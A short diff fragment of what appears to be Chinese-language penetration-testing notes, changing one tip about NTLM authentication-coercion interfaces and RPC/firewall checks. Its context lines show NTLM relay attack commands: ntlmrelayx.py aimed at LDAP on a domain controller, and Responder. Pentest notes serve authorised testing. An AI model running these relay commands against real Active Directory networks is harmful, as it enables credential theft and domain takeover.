@@ -24,4 +24,4 @@ ntlmrelayx.py -t ldap://dc01.domain.local --no-dump
 responder -I eth0 -A
 ```
 
-小记录：不同强制认证接口触发条件不同，失败时先确认 RPC endpoint 和防火墙。
+不同强制认证接口触发条件不同，失败时先确认 RPC endpoint 和防火墙。
